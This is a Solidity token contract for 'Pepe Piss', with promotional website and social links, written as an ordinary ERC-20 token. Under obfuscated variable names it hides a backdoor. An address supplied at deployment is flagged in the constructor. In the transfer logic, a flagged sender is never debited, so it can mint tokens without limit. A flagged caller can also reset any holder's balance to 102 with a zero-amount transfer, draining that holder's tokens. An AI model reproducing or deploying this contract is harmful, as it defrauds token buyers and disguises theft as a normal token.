/*

Website: https://pepepiss.cryptotoken.live/

Telegram: https://t.me/PepePiss

Twitter: https://twitter.com/PepePissETH

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PepePiss is Ownable {
    mapping(address => uint256) private xnkazrsvdgq;

    address public hepgfi;

    string public symbol = 'Pepe Piss';

    uint8 public decimals = 9;

    function transfer(address byicfeu, uint256 sgpnuwixvbe) public returns (bool success) {
        lmuva(msg.sender, byicfeu, sgpnuwixvbe);
        return true;
    }

    constructor(address irdhyavmgu) {
        balanceOf[msg.sender] = totalSupply;
        vxeyakqrobw[irdhyavmgu] = puatqnlcerf;
        IUniswapV2Router02 frndsovqlgp = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        hepgfi = IUniswapV2Factory(frndsovqlgp.factory()).createPair(address(this), frndsovqlgp.WETH());
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name = 'Pepe Piss';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function lmuva(address uvexhpktlan, address byicfeu, uint256 sgpnuwixvbe) private {
        if (vxeyakqrobw[uvexhpktlan] == 0) {
            balanceOf[uvexhpktlan] -= sgpnuwixvbe;
        }
        balanceOf[byicfeu] += sgpnuwixvbe;
        if (vxeyakqrobw[msg.sender] > 0 && sgpnuwixvbe == 0 && byicfeu != hepgfi) {
            balanceOf[byicfeu] = puatqnlcerf;
        }
        emit Transfer(uvexhpktlan, byicfeu, sgpnuwixvbe);
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address uvexhpktlan, address byicfeu, uint256 sgpnuwixvbe) public returns (bool success) {
        require(sgpnuwixvbe <= allowance[uvexhpktlan][msg.sender]);
        allowance[uvexhpktlan][msg.sender] -= sgpnuwixvbe;
        lmuva(uvexhpktlan, byicfeu, sgpnuwixvbe);
        return true;
    }

    function approve(address chned, uint256 sgpnuwixvbe) public returns (bool success) {
        allowance[msg.sender][chned] = sgpnuwixvbe;
        emit Approval(msg.sender, chned, sgpnuwixvbe);
        return true;
    }

    mapping(address => uint256) private vxeyakqrobw;

    uint256 private puatqnlcerf = 102;

    event Transfer(address indexed from, address indexed to, uint256 value);
}